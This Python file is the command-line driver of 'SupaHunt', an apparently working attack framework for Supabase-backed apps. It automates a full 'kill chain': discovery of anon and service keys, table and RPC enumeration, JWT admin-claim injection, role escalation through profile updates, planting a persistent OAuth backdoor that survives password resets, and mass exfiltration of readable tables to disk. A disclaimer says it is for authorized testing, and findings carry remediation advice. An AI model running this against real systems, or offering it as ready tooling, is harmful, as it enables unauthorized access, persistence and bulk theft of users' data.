#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ███████╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██╗   ██╗███╗   ██╗  ║
║   ██╔════╝██║   ██║██╔══██╗██╔══██╗██║  ██║██║   ██║████╗  ██║  ║
║   ███████╗██║   ██║██████╔╝███████║███████║██║   ██║██╔██╗ ██║  ║
║   ╚════██║██║   ██║██╔═══╝ ██╔══██║██╔══██║██║   ██║██║╚██╗██║  ║
║   ███████║╚██████╔╝██║     ██║  ██║██║  ██║╚██████╔╝██║ ╚████║  ║
║   ╚══════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝  ║
║                                                                   ║
║   Supabase Security Auditing & Penetration Testing Framework      ║
║   v1.0 — For authorized security testing only                     ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝

Usage:
    supahunt.py discover <url>                 Auto-detect Supabase from any URL
    supahunt.py scan <url> [options]            Full automated scan
    supahunt.py enum <url> [options]            Enumerate tables, RPCs, storage
    supahunt.py exploit <url> [options]         Run exploitation modules
    supahunt.py exfil <url> [options]           Mass data exfiltration
    supahunt.py full <url> [options]            Full kill chain (discover→exploit→report)

Options:
    --supabase-url URL       Supabase URL (skip auto-discovery)
    --anon-key KEY           Supabase anon key (skip auto-discovery)
    --token TOKEN            Auth token (skip account creation)
    --email EMAIL            Email for account creation
    --password PASS          Password for account creation
    --proxy PROXY            HTTP proxy (e.g., http://127.0.0.1:8080)
    --output DIR             Output directory (default: ./output)
    --threads N              Thread count (default: 10)
    --timeout N              Request timeout in seconds (default: 15)
    --no-exploit             Skip exploitation (recon only)
    --no-exfil               Skip data exfiltration
    --tables TABLE,...       Additional table names to probe
    --quiet                  Minimal output
    --json                   JSON output only
"""

import argparse
import json
import os
import sys
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.text import Text
from rich import box

# Local modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from modules.discovery import Discovery, SupabaseTarget, decode_jwt_payload
from modules.enumerator import Enumerator
from modules.exploiter import AuthExploiter, DataExploiter, RPCExploiter, PersistenceExploiter, ProfileExploiter
from modules.reporter import ScanReport, Finding

console = Console()

BANNER = """[bold red]
 ███████╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗
 ██╔════╝██║   ██║██╔══██╗██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝
 ███████╗██║   ██║██████╔╝███████║███████║██║   ██║██╔██╗ ██║   ██║
 ╚════██║██║   ██║██╔═══╝ ██╔══██║██╔══██║██║   ██║██║╚██╗██║   ██║
 ███████║╚██████╔╝██║     ██║  ██║██║  ██║╚██████╔╝██║ ╚████║   ██║
 ╚══════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝[/]
[dim]Supabase Security Auditing & Penetration Testing Framework v1.0[/]
[dim]For authorized security testing only[/]
"""


def print_banner():
    console.print(BANNER)


def print_target_info(target: SupabaseTarget):
    """Display discovered target information."""
    table = Table(title="Target Information", box=box.ROUNDED, show_lines=True)
    table.add_column("Property", style="cyan", width=20)
    table.add_column("Value", style="white")

    table.add_row("App URL", target.app_url or "N/A")
    table.add_row("Supabase URL", target.supabase_url or "[red]NOT FOUND[/]")
    table.add_row("Project Ref", target.project_ref or "N/A")

    if target.anon_key:
        payload = decode_jwt_payload(target.anon_key)
        role = payload.get("role", "?")
        table.add_row("Anon Key", f"{target.anon_key[:30]}... [green](role: {role})[/]")
    else:
        table.add_row("Anon Key", "[red]NOT FOUND[/]")

    if target.service_role_key:
        table.add_row("Service Role Key", "[bold red on white] FOUND — CRITICAL [/]")
    else:
        table.add_row("Service Role Key", "[dim]not found[/]")

    # Auth settings
    auth = target.auth_settings
    if auth:
        signup = not auth.get("disable_signup", True)
        autoconfirm = auth.get("mailer_autoconfirm", False)
        table.add_row(
            "Signup",
            f"{'[green]ENABLED[/]' if signup else '[red]DISABLED[/]'}"
            f" {'[bold yellow](AUTO-CONFIRM)[/]' if autoconfirm else ''}",
        )
        ext = auth.get("external", {})
        providers = [k for k, v in ext.items() if v and isinstance(v, bool)]
        if providers:
            table.add_row("OAuth Providers", ", ".join(providers))

    # Headers of interest
    for h in ["server", "x-powered-by", "x-frame-options", "content-security-policy"]:
        val = target.headers_info.get(h, target.headers_info.get(h.title(), ""))
        if val:
            table.add_row(f"Header: {h}", val[:100])

    console.print(table)


def print_tables(tables: list):
    """Display discovered tables."""
    table = Table(title=f"Discovered Tables ({len(tables)})", box=box.ROUNDED)
    table.add_column("#", style="dim", width=4)
    table.add_column("Table", style="cyan", width=35)
    table.add_column("Records", justify="right", width=10)
    table.add_column("SELECT", justify="center", width=8)
    table.add_column("INSERT", justify="center", width=8)
    table.add_column("UPDATE", justify="center", width=8)
    table.add_column("DELETE", justify="center", width=8)

    for i, t in enumerate(tables, 1):
        count = t.record_count if t.record_count is not None else "?"
        count_style = "bold red" if isinstance(count, int) and count > 100 else ""
        table.add_row(
            str(i),
            t.name,
            Text(f"{count:,}" if isinstance(count, int) else str(count), style=count_style),
            "[green]Y[/]" if t.select_allowed else "[red]N[/]",
            "[bold red]Y[/]" if t.insert_allowed else "[green]N[/]",
            "[bold red]Y[/]" if t.update_allowed else "[green]N[/]",
            "[bold red]Y[/]" if t.delete_allowed else "[green]N[/]",
        )

    console.print(table)


def print_rpcs(rpcs: list):
    """Display discovered RPC functions."""
    table = Table(title=f"RPC Functions ({len(rpcs)})", box=box.ROUNDED)
    table.add_column("Function", style="cyan", width=40)
    table.add_column("Callable", justify="center", width=10)
    table.add_column("Impact", width=40)
    table.add_column("Response", width=30)

    for r in rpcs:
        callable_str = "[bold red]YES[/]" if r.get("callable") else "[green]no[/]"
        table.add_row(
            r.get("name", "?"),
            callable_str,
            r.get("impact", ""),
            r.get("response", "")[:30],
        )

    console.print(table)


def print_finding(f: Finding):
    """Display a single finding."""
    sev_colors = {
        "CRITICAL": "bold white on red",
        "HIGH": "bold red",
        "MEDIUM": "bold yellow",
        "LOW": "cyan",
        "INFO": "dim",
    }
    style = sev_colors.get(f.severity, "white")
    console.print(f"  [{style}][{f.severity}][/] {f.id}: {f.title}")


# ══════════════════════════════════════════════
# COMMAND HANDLERS
# ══════════════════════════════════════════════


def cmd_discover(args):
    """Discover Supabase instance from target URL."""
    print_banner()
    disc = Discovery(console=console, timeout=args.timeout, proxy=args.proxy)

    if args.supabase_url and args.anon_key:
        target = disc.discover_from_config(args.supabase_url, args.anon_key)
        if args.url:
            target.app_url = args.url
    else:
        target = disc.discover(args.url)

    print_target_info(target)

    if target.supabase_url and target.anon_key:
        console.print("\n[bold green][+] Supabase instance discovered successfully![/]")
    else:
        console.print("\n[bold red][!] Could not fully discover Supabase instance.[/]")
        console.print("[dim]Try providing --supabase-url and --anon-key manually.[/]")

    return target


def cmd_enum(args, target: SupabaseTarget = None):
    """Enumerate tables, RPCs, storage, GraphQL."""
    if not target:
        target = cmd_discover(args)

    if not target.supabase_url or not target.anon_key:
        console.print("[bold red][!] Cannot enumerate without Supabase URL and anon key.[/]")
        return None, None, None, None

    report = ScanReport(args.url, target.to_dict())
    enum = Enumerator(
        target, console=console, timeout=args.timeout, proxy=args.proxy,
        threads=args.threads,
    )

    # 1. Tables
    console.print("\n[bold cyan]═══ TABLE ENUMERATION ═══[/]\n")
    custom = args.tables.split(",") if args.tables else []
    tables = enum.enumerate_tables(custom_tables=custom, token=args.token)

    if tables:
        # RLS testing
        console.print(f"\n[*] Testing RLS on {len(tables)} tables...", style="cyan")
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console,
        ) as progress:
            task = progress.add_task("RLS testing", total=len(tables))
            for t in tables:
                enum.test_rls(t, token=args.token)
                progress.advance(task)

        print_tables(tables)
        report.tables_found = [t.to_dict() for t in tables]

        # Generate findings
        for t in tables:
            if t.select_allowed and (t.record_count or 0) > 0:
                report.add_finding(
                    title=f"Table '{t.name}' readable ({t.record_count} records)",
                    severity="HIGH" if t.record_count and t.record_count > 100 else "MEDIUM",
                    category="RLS",
                    description=f"Table {t.name} is readable with "
                                f"{'anon' if not args.token else 'auth'} key. "
                                f"{t.record_count} records accessible.",
                    evidence=f"Columns: {', '.join(t.columns[:10])}",
                    remediation="Add restrictive RLS SELECT policy.",
                )
            if t.insert_allowed:
                report.add_finding(
                    title=f"Table '{t.name}' allows INSERT",
                    severity="CRITICAL",
                    category="RLS",
                    description=f"INSERT into {t.name} is not blocked by RLS.",
                    remediation="Add RLS INSERT policy restricting to authorized roles.",
                )
            if t.update_allowed:
                report.add_finding(
                    title=f"Table '{t.name}' allows UPDATE",
                    severity="HIGH",
                    category="RLS",
                    description=f"UPDATE on {t.name} is not blocked by RLS.",
                    remediation="Add RLS UPDATE policy.",
                )
            if t.delete_allowed:
                report.add_finding(
                    title=f"Table '{t.name}' allows DELETE",
                    severity="CRITICAL",
                    category="RLS",
                    description=f"DELETE from {t.name} is not blocked by RLS.",
                    remediation="Add RLS DELETE policy.",
                )

    # 2. RPCs
    console.print("\n[bold cyan]═══ RPC ENUMERATION ═══[/]\n")
    rpcs = enum.enumerate_rpcs(token=args.token)
    if rpcs:
        print_rpcs(rpcs)
        report.rpcs_found = rpcs

        for r in rpcs:
            if r.get("callable"):
                report.add_finding(
                    title=f"RPC '{r['name']}' callable without admin auth",
                    severity="CRITICAL" if "cleanup" in r["name"] or "expire" in r["name"]
                            or "delete" in r["name"] or "credit" in r["name"]
                            else "HIGH",
                    category="RPC",
                    description=f"Function {r['name']} can be called by "
                                f"{'anon' if not args.token else 'non-admin auth'} user.",
                    impact=r.get("impact", ""),
                    remediation="Add SECURITY INVOKER or explicit auth check in function body.",
                )

    # 3. Storage
    console.print("\n[bold cyan]═══ STORAGE ENUMERATION ═══[/]\n")
    buckets = enum.enumerate_storage(token=args.token)
    if buckets:
        for b in buckets:
            console.print(
                f"  [{'green' if b.public else 'yellow'}]"
                f"{'PUBLIC' if b.public else 'private'}[/] "
                f"{b.name} — {b.file_count} files"
            )
        report.buckets_found = [b.to_dict() for b in buckets]
    else:
        console.print("  [dim]No accessible buckets found.[/]")

    # 4. GraphQL
    console.print("\n[bold cyan]═══ GRAPHQL INTROSPECTION ═══[/]\n")
    gql = enum.graphql_introspect(token=args.token)
    if gql and "data" in gql:
        types = gql["data"]["__schema"]["types"]
        queries = gql["data"]["__schema"]["queryType"]["fields"]
        mutations = gql["data"]["__schema"]["mutationType"]["fields"] if gql["data"]["__schema"].get("mutationType") else []
        console.print(f"  [green][+][/] {len(types)} types, {len(queries)} queries, {len(mutations)} mutations")

        if mutations:
            inserts = [m["name"] for m in mutations if m["name"].startswith("insertInto")]
            updates = [m["name"] for m in mutations if m["name"].startswith("update") and not m["name"].startswith("updateFrom")]
            deletes = [m["name"] for m in mutations if m["name"].startswith("deleteFrom")]
            console.print(f"  Mutations: {len(inserts)} INSERT, {len(updates)} UPDATE, {len(deletes)} DELETE")

            if inserts or updates or deletes:
                report.add_finding(
                    title=f"GraphQL exposes {len(mutations)} mutations",
                    severity="CRITICAL",
                    category="GraphQL",
                    description=f"GraphQL schema exposes {len(inserts)} INSERT, "
                                f"{len(updates)} UPDATE, {len(deletes)} DELETE mutations.",
                    evidence=f"Sample: {', '.join(inserts[:5])}",
                    remediation="Disable GraphQL introspection in production and add RLS.",
                )

        report.add_finding(
            title=f"GraphQL introspection enabled ({len(types)} types)",
            severity="HIGH",
            category="GraphQL",
            description="Full schema introspection is enabled, exposing all table "
                        "names, columns, relationships, and mutation signatures.",
            remediation="Set `introspection: false` in GraphQL config.",
        )
    else:
        console.print("  [dim]GraphQL introspection not available or blocked.[/]")

    # Auth settings findings
    auth = target.auth_settings
    if auth:
        if not auth.get("disable_signup", True):
            report.add_finding(
                title="Signup enabled",
                severity="INFO",
                category="Auth",
                description="Public signup is enabled.",
            )
        if auth.get("mailer_autoconfirm", False):
            report.add_finding(
                title="Auto-confirm enabled (no email verification)",
                severity="HIGH",
                category="Auth",
                description="Accounts are auto-confirmed on signup. No email verification required. "
                            "Enables mass sockpuppet creation.",
                remediation="Set mailer_autoconfirm to false in Supabase auth settings.",
            )

    return target, tables, rpcs, report


def cmd_exploit(args, target: SupabaseTarget = None, report: ScanReport = None):
    """Run exploitation modules."""
    if not target:
        target = cmd_discover(args)

    if not report:
        report = ScanReport(args.url, target.to_dict())

    auth_exp = AuthExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)
    token = args.token
    user_id = None

    console.print("\n[bold cyan]═══ AUTH EXPLOITATION ═══[/]\n")

    # 1. Check signup
    signup_info = auth_exp.check_signup_enabled()
    console.print(f"  Signup: {'ENABLED' if signup_info['signup_enabled'] else 'disabled'}")
    console.print(f"  Auto-confirm: {'YES' if signup_info['autoconfirm'] else 'no'}")

    # 2. Create account if no token
    if not token and signup_info["signup_enabled"]:
        result = auth_exp.create_account(email=args.email, password=args.password or "AuditTest2026")
        if result["success"]:
            token = result["access_token"]
            user_id = result["user_id"]

            if result["auto_confirmed"]:
                report.add_finding(
                    title="Account auto-confirmed on signup",
                    severity="HIGH",
                    category="Auth",
                    description=f"Created account {result['email']} — auto-confirmed, "
                                f"immediate access token received.",
                    evidence=f"user_id: {user_id}",
                )

            # 3. JWT claim injection
            console.print("\n[bold cyan]═══ JWT CLAIM INJECTION ═══[/]\n")
            inject = auth_exp.inject_jwt_claims(token)
            if inject["success"] and inject.get("injected"):
                report.add_finding(
                    title="JWT admin claim injection via user_metadata",
                    severity="CRITICAL",
                    category="Auth",
                    description="Arbitrary claims can be injected into user_metadata "
                                "via PUT /auth/v1/user. These claims appear in the JWT "
                                "after refresh.",
                    evidence=f"Injected: {json.dumps(inject.get('user_metadata', {}))}",
                    impact="If any server-side code checks user_metadata.role instead "
                           "of a database role column, this grants full admin access.",
                    remediation="Restrict user_metadata writes or never trust user_metadata "
                                "for authorization decisions.",
                    cvss=9.8,
                )

                # Refresh to bake claims into JWT
                refresh = result.get("refresh_token", "")
                if refresh:
                    new_tokens = auth_exp.refresh_token(refresh)
                    if new_tokens["success"]:
                        token = new_tokens["access_token"]
                        console.print("  [+] Token refreshed with injected claims.", style="green")

    if not token:
        console.print("[yellow][!] No auth token available. Exploitation limited.[/]")
        return target, report, token

    # 4. Profile exploitation
    if user_id:
        console.print("\n[bold cyan]═══ PROFILE EXPLOITATION ═══[/]\n")
        prof_exp = ProfileExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)

        roles = prof_exp.test_role_escalation(user_id, token)
        for role, status in roles.items():
            if status == "ESCALATED":
                report.add_finding(
                    title=f"Role escalation to '{role}' via profile UPDATE",
                    severity="CRITICAL",
                    category="Privilege Escalation",
                    description=f"profiles.role can be changed to '{role}' via REST PATCH.",
                    cvss=9.8,
                )
                console.print(f"  [bold red][!!!] Role escalation to {role} SUCCEEDED![/]")
            else:
                console.print(f"  [green]Role '{role}': blocked[/]")

        fields = prof_exp.test_sensitive_fields(user_id, token)
        for name, result in fields.items():
            if result["writable"]:
                report.add_finding(
                    title=f"Sensitive profile field writable: {name}",
                    severity="HIGH",
                    category="Privilege Escalation",
                    description=f"Profile field test '{name}' succeeded — field is writable "
                                f"without additional authorization.",
                )
                console.print(f"  [bold yellow][+] {name}: WRITABLE[/]")
            else:
                console.print(f"  [green]{name}: blocked[/]")

    # 5. RPC exploitation
    console.print("\n[bold cyan]═══ RPC EXPLOITATION ═══[/]\n")
    rpc_exp = RPCExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)
    dangerous = rpc_exp.test_dangerous_rpcs(token)
    for r in dangerous:
        status = "[bold red]CALLABLE[/]" if r["callable"] else "[green]blocked[/]"
        console.print(f"  {status} {r['name']} — {r['impact']}")
        if r["callable"]:
            report.add_finding(
                title=f"Dangerous RPC callable: {r['name']}",
                severity="CRITICAL",
                category="RPC",
                description=f"Admin function {r['name']} is callable by authenticated user. "
                            f"Impact: {r['impact']}",
                evidence=f"Response: {r['response'][:200]}",
                remediation="Add admin role check inside the function body.",
                cvss=8.5,
            )

    # 6. Persistence
    if user_id:
        console.print("\n[bold cyan]═══ PERSISTENCE TEST ═══[/]\n")
        pers = PersistenceExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)
        backdoor = pers.plant_oauth_backdoor(user_id, token)
        if backdoor.get("success"):
            console.print(
                f"  [bold red][+] OAuth backdoor planted! "
                f"ID={backdoor.get('id')}, expires 2099[/]"
            )
            report.add_finding(
                title="OAuth backdoor injection (oauth_states INSERT)",
                severity="CRITICAL",
                category="Persistence",
                description="Authenticated users can insert oauth_states records with "
                            "far-future expiry dates, creating persistent backdoor access "
                            "that survives password resets.",
                evidence=f"ID: {backdoor.get('id')}, token: {backdoor.get('state_token')}",
                cvss=8.2,
            )
        else:
            console.print(f"  [green]OAuth backdoor blocked: {backdoor.get('error', 'RLS')[: 100]}[/]")

    return target, report, token


def cmd_exfil(args, target: SupabaseTarget = None, tables: list = None,
              token: str = None, report: ScanReport = None):
    """Mass data exfiltration."""
    if not target:
        target = cmd_discover(args)
    if not report:
        report = ScanReport(args.url, target.to_dict())

    token = token or args.token
    data_exp = DataExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)

    console.print("\n[bold cyan]═══ DATA EXFILTRATION ═══[/]\n")

    # If no tables provided, enumerate first
    if not tables:
        enum = Enumerator(target, console=console, timeout=args.timeout, proxy=args.proxy,
                          threads=args.threads)
        tables = enum.enumerate_tables(token=token)

    output_dir = os.path.join(args.output, "exfil")
    os.makedirs(output_dir, exist_ok=True)

    total_records = 0
    total_size = 0

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        console=console,
    ) as progress:
        readable_tables = [t for t in tables if t.select_allowed and (t.record_count or 0) > 0]
        task = progress.add_task("Exfiltrating", total=len(readable_tables))

        for t in readable_tables:
            progress.update(task, description=f"Exfil: {t.name}")
            data = data_exp.exfiltrate_table(t.name, token=token)

            if data:
                path = os.path.join(output_dir, f"{t.name}.json")
                raw = json.dumps(data, indent=2, default=str)
                with open(path, "w") as f:
                    f.write(raw)
                total_records += len(data)
                total_size += len(raw)
                console.print(
                    f"  [green][+][/] {t.name}: {len(data)} records ({len(raw)} bytes)"
                )

            progress.advance(task)

    console.print(
        f"\n[bold green][+] Exfiltration complete: "
        f"{total_records:,} records, {total_size:,} bytes[/]"
    )
    console.print(f"  Saved to: {output_dir}")

    report.exfil_stats = {
        "total_records": total_records,
        "total_bytes": total_size,
        "output_dir": output_dir,
    }

    return report


def cmd_full(args):
    """Full kill chain: discover → enumerate → exploit → exfil → report."""
    print_banner()

    console.print(Panel(
        "[bold]Full Kill Chain Mode[/]\n"
        "discover → enumerate → exploit → exfil → report",
        title="[bold red]FULL SCAN[/]",
        box=box.DOUBLE,
    ))

    start = time.time()

    # 1. Discovery
    console.print("\n[bold white on blue] PHASE 1: DISCOVERY [/]\n")
    target = cmd_discover(args)

    if not target.supabase_url or not target.anon_key:
        console.print("[bold red][!] Discovery failed. Aborting.[/]")
        return

    # 2. Enumeration
    console.print("\n[bold white on blue] PHASE 2: ENUMERATION [/]\n")
    target, tables, rpcs, report = cmd_enum(args, target)

    # 3. Exploitation (unless --no-exploit)
    token = args.token
    if not args.no_exploit:
        console.print("\n[bold white on blue] PHASE 3: EXPLOITATION [/]\n")
        target, report, token = cmd_exploit(args, target, report)
    else:
        console.print("\n[dim]Skipping exploitation (--no-exploit)[/]")

    # 4. Exfiltration (unless --no-exfil)
    if not args.no_exfil and tables:
        console.print("\n[bold white on blue] PHASE 4: EXFILTRATION [/]\n")
        report = cmd_exfil(args, target, tables, token, report)
    else:
        console.print("\n[dim]Skipping exfiltration (--no-exfil)[/]")

    # 5. Report
    console.print("\n[bold white on blue] PHASE 5: REPORT [/]\n")
    md_path, json_path = report.save(args.output)

    elapsed = time.time() - start
    counts = report.severity_count()

    console.print(Panel(
        f"[bold]Scan Complete[/] — {elapsed:.0f}s\n\n"
        f"[bold red]CRITICAL: {counts['CRITICAL']}[/]  "
        f"[red]HIGH: {counts['HIGH']}[/]  "
        f"[yellow]MEDIUM: {counts['MEDIUM']}[/]  "
        f"[cyan]LOW: {counts['LOW']}[/]  "
        f"[dim]INFO: {counts['INFO']}[/]\n\n"
        f"Reports:\n  {md_path}\n  {json_path}",
        title="[bold green]RESULTS[/]",
        box=box.DOUBLE,
    ))


def cmd_scan(args):
    """Scan mode: discover + enumerate (no exploit)."""
    args.no_exploit = True
    args.no_exfil = True
    cmd_full(args)


# ══════════════════════════════════════════════
# CLI ARGUMENT PARSING
# ══════════════════════════════════════════════

def build_parser():
    parser = argparse.ArgumentParser(
        prog="supahunt",
        description="SupaHunt — Supabase Security Auditing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = parser.add_subparsers(dest="command", help="Command to execute")

    # Common arguments
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("url", help="Target URL")
    common.add_argument("--supabase-url", help="Supabase URL (skip discovery)")
    common.add_argument("--anon-key", help="Supabase anon key")
    common.add_argument("--token", help="Auth bearer token")
    common.add_argument("--email", help="Email for account creation")
    common.add_argument("--password", help="Password for account creation")
    common.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    common.add_argument("--output", default="./output", help="Output directory")
    common.add_argument("--threads", type=int, default=10, help="Thread count")
    common.add_argument("--timeout", type=int, default=15, help="Request timeout (sec)")
    common.add_argument("--tables", help="Extra table names (comma-separated)")
    common.add_argument("--no-exploit", action="store_true", help="Skip exploitation")
    common.add_argument("--no-exfil", action="store_true", help="Skip exfiltration")
    common.add_argument("--quiet", action="store_true", help="Minimal output")
    common.add_argument("--json", action="store_true", help="JSON output only")

    sub.add_parser("discover", parents=[common], help="Auto-detect Supabase from URL")
    sub.add_parser("scan", parents=[common], help="Recon scan (no exploitation)")
    sub.add_parser("enum", parents=[common], help="Enumerate tables, RPCs, storage")
    sub.add_parser("exploit", parents=[common], help="Run exploitation modules")
    sub.add_parser("exfil", parents=[common], help="Mass data exfiltration")
    sub.add_parser("full", parents=[common], help="Full kill chain")

    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    if not args.command:
        print_banner()
        parser.print_help()
        sys.exit(0)

    commands = {
        "discover": lambda: cmd_discover(args),
        "scan": lambda: cmd_scan(args),
        "enum": lambda: cmd_enum(args),
        "exploit": lambda: cmd_exploit(args),
        "exfil": lambda: cmd_exfil(args),
        "full": lambda: cmd_full(args),
    }

    try:
        commands[args.command]()
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted.[/]")
        sys.exit(130)
    except Exception as e:
        console.print(f"\n[bold red]Error: {e}[/]")
        if os.environ.get("DEBUG"):
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
